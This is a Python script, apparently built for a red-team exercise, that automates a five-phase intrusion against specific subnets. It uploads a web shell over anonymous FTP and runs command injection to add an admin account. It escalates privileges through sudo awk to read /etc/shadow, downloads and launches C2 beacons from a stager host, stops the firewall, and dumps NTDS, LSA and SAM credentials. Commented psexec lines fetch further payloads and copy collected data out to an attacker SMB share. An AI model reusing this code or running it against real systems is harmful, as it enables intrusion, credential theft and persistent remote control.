import subprocess
import time
import requests
import os
import sys
import paramiko
import datetime


def check_root():
	# Check if the script is run as root
	if os.geteuid() != 0:
		print('Please run the script as root (using sudo).')
		sys.exit(1)

def log_event(message):
	timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
	log_entry = f"{timestamp} - {message}\n"
	with open("logfile.txt", "a") as logfile:
		logfile.write(log_entry)

def execute_ssh_commands(username, password, host, commands):
    # Create an SSH client
    client = paramiko.SSHClient()

    try:
        # Automatically add the server's host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the SSH server
        client.connect(host, username=username, password=password)

        for command in commands:
            # Execute each command with the password
            full_command = f"nohup {command} > /dev/null 2>&1 &"
            stdin, stdout, stderr = client.exec_command(full_command)

            # Print the output
            print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")

    finally:
        # Close the SSH connection
        client.close()

def phaseOne():
	log_event("Phase one attack initiating.")
	# Define attack space 
	subnet = "208.11.26.0/24"
	target_ip = "208.11.26.100"
	# Run fping against the subnet
	print(f"Running fping against the subnet {subnet}")
	log_event(f"Started fping against the target subnet {subnet}")
	subprocess.run(["fping", "-g", subnet, "-a"])
	# Wait for 3 minutes
	print("Waiting for 3 minutes...")
	log_event("Sleeping for 3 minutes.")
	time.sleep(180)
	# Run nmap with aggressive scanning and no ping against the target IP
	print(f"Running nmap against the target IP {target_ip}")
	log_event(f"Started NMAP -A against {target_ip}")
	subprocess.run(["sudo", "nmap", "-A", "-Pn", target_ip])
	# Wait for another 3 minutes
	print("Waiting for another 5 minutes...")
	log_event("Sleeping for 5 minutes.")
	time.sleep(300)
	# Connect to FTP at the target IP using anonymous login
	log_event(f"Exploiting FTP & Uploading command injection tool to {target_ip}")
	print(f"Connecting to FTP at {target_ip} with anonymous login")
	ftp_script = """
	quote USER anonymous
	quote PASS anonymous@
	cd uploads
	ls
	put diagnostics.aspx
	quit
	"""
	subprocess.run(["ftp", "-n", target_ip], input=ftp_script, text=True)
	print("FTP session ended")
	# use curl to emulate adversary enumeration
	whoami = "whoami%20/priv"
	pwd = "pwd"
	listDesktop = "dir%20C%3A%5CUsers%5CAdministrator%5CDesktop"
	getDocument = "type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Clazy%5Fadmin%2Etxt"
	#Add evil admin account named yujrio.hanma with password123! as  the password.
	addEvilAdmin = "net%20user%20%2Fadd%20evil%20password123%21"
	# Add evil admin to administrators group
	addAdminGroup = "net%20localgroup%20administrators%20yujiro%2Ehanma%20%2Fadd"
	systeminfo = "systeminfo"
	log_event(f"initiation curl command injections against {target_ip}!")
	# Set up URL Encoded curl requests
	#curlone = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={whoami}"
	#curltwo = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={dir}"
	#curlthree = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={listDesktop}"
	#curlfour = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={getDocument}"
	#curlfive = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addEvilAdmin}"
	#curlsix = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addAdminGroup}"
	#curlseven = f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={systeminfo}"
	# Execute requests
	#subprocess.run(curlone, shell=True, text=True)
	#subprocess.run(curltwo, shell=True, text=True)
	#subprocess.run(curlthree, shell=True, text=True)
	#subprocess.run(curlfour, shell=True, text=True)
	#subprocess.run(curlfive, shell=True, text=True)
	#subprocess.run(curlsix, shell=True, text=True)	
	commands = [
	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={whoami}",
	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={pwd}",
	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={listDesktop}",
	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={getDocument}",
	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addEvilAdmin}",
	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={addAdminGroup}",
	f"curl http://{target_ip}/uploads/diagnostics.aspx?cmd={systeminfo}"
	]

	# Execute requests using a for loop
	for command in commands:
		log_event(f"Executing {command}")
		subprocess.run(command, shell=True, text=True)
		
	log_event("Phase One tasks finished.")
	print("Phase One is Complete.")

def phaseTwo():
	log_event("Initiating Phase Two.")
	subnet = "208.11.23.0/24"
	target_ip = "208.11.23.201"
	username = "ethan.reynolds"
	password = "bubblewrap69"
	# Run fping against the subnet
	print(f"Running fping against the subnet {subnet}")
	log_event(f"Launched fping against target subnet {subnet}")
	subprocess.run(["fping", "-g", subnet, "-a"])
	# Wait for 3 minutes
	print("Waiting for 3 minutes...")
	log_event("Sleeping for 3 minutes.")
	time.sleep(180)
	# Run Crackmapexec for ssh on the target subnet 
	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
	log_event(f"Initiating Crackmapexec over ssh against target {subnet}")
	subprocess.run(cme, shell=True, text=True)
	# Initial SSH Connection, enumerate, and then perform privesc
	awkStage = "sudo -S awk 'BEGIN {system(\"/bin/sh -c whoami && curl http://185.141.62.2:8000/agetty -o /root/agetty\ && chmod +x /root/agetty && cat /etc/shadow\")}'"
	awkC2 = "sudo -S awk 'BEGIN {system(\"/bin/sh -c /root/agetty &\")}'"
	commands = [
	"whoami",
	f"echo {password} | sudo -S -l",
	"pwd",
	f"echo {password} | {awkStage}"
	]
	client = paramiko.SSHClient()

	try:
		# Automatically add the server's host key
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		# Connect to the SSH server
		log_event(f"Connecting to {target_ip} via SSH.")
		client.connect(target_ip, username=username, password=password)

		for command in commands:
			# Execute each command with the password
			full_command = f"{command}"
			log_event(f"Command sent to SSH session {full_command}.")
			stdin, stdout, stderr = client.exec_command(full_command)

			# Print the output
			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Finish command loop and then run C2 Beacon in the background
		full_command = f"echo {password} | {awkC2}"
		log_event(f"Command sent to SSH session {full_command}.")
		stdin, stdout, stderr = client.exec_command(full_command + '&', timeout=5)
		print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Close the SSH connection
		client.close()
	except Exception as e:
		pass
	print("finished phase two tasks.")
	log_event("Phase Two tasks complete.")
	
def phaseThreept1():
	log_event("Starting Phase Three Part 1.")
	# Users ethan.renolds, backup, Kenneth.Mcneil, Alta.Dudley, Quentin.White, and Blake.Hayness added to 23.201
	# ethan.reynolds - bubblewrap69, backup - michaelwashere Kenneth.Mcneil - password123, Alta.Dudley - hellokitty, Quentin.White - qweasdzxcQWEASDZXC, Blake.Hayness - qazwsxedcQAZWSXEDC
	subnet = "208.11.25.0/24"
	target_ip = "208.11.25.204"
	crackedUsers = "usernames.txt"
	crackedPasswords = "passwords.txt"
	username = "backup"
	password = "michaelwashere"
	# Run fping against the subnet
	print(f"Running fping against the subnet {subnet}")
	log_event(f"Fping against target {subnet}")
	subprocess.run(["fping", "-g", subnet, "-a"])
	print("Sleeping for 5 minutes.")
	time.sleep(300)
	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
	log_event(f"Running crackmapexec with cracked creds against {target_ip}")
	subprocess.run(cme, shell=True, text=True)
	commands = [
	"pwd",
	"curl http://185.141.62.2:8000/pspy -o /tmp/pspy",
	"chmod +x /tmp/pspy",
	"cd /var/log/mon",
	"curl http://185.141.62.2:8000/backup.sh -o /var/log/mon/backup.sh"
	]
	client = paramiko.SSHClient()
	try:
		# Automatically add the server's host key
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		# Connect to the SSH server
		log_event(f"Connecting to {target_ip} via SSH.")
		client.connect(target_ip, username=username, password=password)
		for command in commands:
			# Execute each command with the password
			full_command = f"{command}"
			log_event(f"Command sent to SSH session {full_command}.")
			stdin, stdout, stderr = client.exec_command(full_command)
			# Print the output
			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Close the SSH connection
		client.close()
	except Exception as e:
		pass
	log_event("Phase Three Part 1 complete.")
		
def phaseThreept2():
	log_event("Starting Phase Three Part 2.")
	target_ip = "208.11.25.204"
	username = "backup"
	password = "michaelwashere"
	print("starting part two..")
	sliverC2 = "sudo /root/zsh &"
	commands = [
	"rm -rf /var/log/mon/backup.sh",
	"sudo systemctl stop firewalld",
	"curl http://185.141.62.2:8000/zsh -o /root/zsh",
	"chmod +x /root/zsh",
	]
	client = paramiko.SSHClient()
	try:
		# Automatically add the server's host key
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		# Connect to the SSH server
		log_event(f"Connecting to {target_ip} via SSH.")
		client.connect(target_ip, username=username, password=password)

		for command in commands:
			# Execute each command with the password
			full_command = f"sudo {command}"
			log_event(f"Command sent to SSH session {full_command}.")
			stdin, stdout, stderr = client.exec_command(full_command)

			# Print the output
			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
		# Finish command loop and then run C2 Beacon in the background
		log_event(f"Command sent to SSH session {sliverC2}.")
		stdin, stdout, stderr = client.exec_command(sliverC2, timeout=5)
		print(f"Command: {sliverC2}\nOutput:\n{stdout.read().decode()}")
		# Close the SSH connection
		client.close()
	except Exception as e:
		pass
	print("finished phase three tasks.")
	log_event("Phase Three Part 2 complete.")
	
def phaseThree():
	log_event("Initiating Phase Three tasks.")
	phaseThreept1()
	print("Finished Part One. Sleeping to allow cronjob privesc to run.")
	log_event("Sleeping to allow cron privesc to run its course.")
	time.sleep(60)
	print("done. Executing part two.")
	phaseThreept2()
	print("Phase Three done.")
	log_event("Phase Three tasks complete.")

def phaseFour():
	log_event("Initiating Phase Four enumeration.")
	# Run fping against the subnet
	#print(f"Running fping against the subnet {subnet[0]}")
	#subprocess.run(["fping", "-g", subnet[0], "-a",">","alives.txt"])
	#print(f"Running fping against the subnet {subnet[1]}")
	#subprocess.run(["fping", "-g", subnet[1], "-a",">>","alives.txt])
	#print(f"Running nmap against the target IP {target_ip}")
	#subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL","alives.txt","-oN","enum.txt"])
	subnets = [
	"208.11.20.0/24",
	"208.11.21.0/27",
	"208.11.21.32/27",
	"208.11.21.64/27",
	"208.11.21.128/27",
	"208.11.21.160/27",
	"208.11.21.192/27",
	"208.11.21.224/27"
	]
	alive_hosts = []

	# Run fping and populate alive_hosts list
	for subnet in subnets:
		log_event(f"Running fping against target {subnet}")
		print(f"Running fping against the subnet {subnet}")
		result = subprocess.run(["fping", "-g", subnet, "-a"], capture_output=True, text=True)
		alive_hosts.extend(result.stdout.splitlines())

	# Write alive hosts to alives.txt
	log_event("Writing alives.txt.")
	with open("alives.txt", "w") as file:
		file.write("\n".join(alive_hosts))

	log_event("Sleeping for 5 minutes.")
	time.sleep(300)
	# Run nmap against the alive hosts
	log_event(f"Initiating aggresive nmap against alive hosts in {subnets[0]} & {subnets[1]}")
	print(f"Running nmap against the targets {subnets[0]} and {subnets[1]}")
	subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL", "alives.txt", "-oN", "enum.txt"])
	log_event("Phase four enumeration complete.")
	print("Done with enumeration. Sanders will proceed with manual log4j exploitation.")
	

def phaseFive():
	log_event("Initiating Phase 5. Starting with dumps.")
	DC2 = "208.11.21.100"
	#Change with evil domain admin from phase four.
	username = "administrator"
	password = "P@ssw0rd"
	commands = [
	f"bash -c 'crackmapexec smb {DC2} -u {username} -p {password} --ntds --obfs > ntds.txt'",
	f"bash -c 'crackmapexec smb {DC2} -u {username} -p {password} --lsa --obfs > lsa.txt'",
	f"bash -c 'crackmapexec smb {DC2} -u {username} -p {password} --sam --obfs > sam.txt'"
	]
	for command in commands:
		try:
			print(f"Running {command}. Waiting for 30 seconds.")
			log_event(f"Allowing task to run {command}.")
			subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
		except Exception as e:
			pass
	log_event(f"Dumps complete.")
	print(f"Proceed with manual impacket-psexec and evil-winrm tasks.")

	# The following is for DC2
	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/svchost.exe -out C:\Users\Administrator\Music\svchost.exe"
	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\svchost.exe --CollectionMethods All --zipfilename zubat.zip"
	# impacket-psexec {username}:{password}@target "powershell.exe -c copy-item -Path C:\Users\Administrator\Music\*.zip -destination \\185.141.62.2\tmp"
	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/ctfmon.exe -out C:\Users\Administrator\Pictures\ctfmon.exe"
	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Pictures\ctfmon.exe"
	# The following is for Maint Laptop 208.11.23.1
	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/wazuh.exe -out C:\Users\Administrator\Music\wazuh.exe"
	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\wazuh.exe"



def main():
	log_event("Script initiated")
	# Ensure Sudo Usage
	#check_root()
	# Run phaseOne function
	#phaseOne
	#phaseTwo()
	#phaseThree()
	#phaseFour()
	#phaseFive()
	
	'''
			Red Team IP Space	
	======================================
	subnet / IP		|	Purpose
	======================================
	185.141.62.2	HTTP Stager Server
	185.141.62.5	impacket-SMB Server
	94.249.192.0/24	Kali 1 / Commando VMs
	185.141.62.0/24	Kali 2 VMs
	185.141.62.3	Phase 1 Attack System
	94.249.192.3	Phase 2 Attack System
	185.141.62.4	Phase 3 Attack System
	94.249.192.1	Phase 4 Attack System
	185.141.62.6	Phase 5 Attack System
	94.249.192.2	Phase 6 Attack System
	94.249.192.4	Phase 6 Attack System
	94.249.192.5	Sliver C2 Server
	======================================
	'''
	log_event("Script completed")

if __name__ == "__main__":
	main()
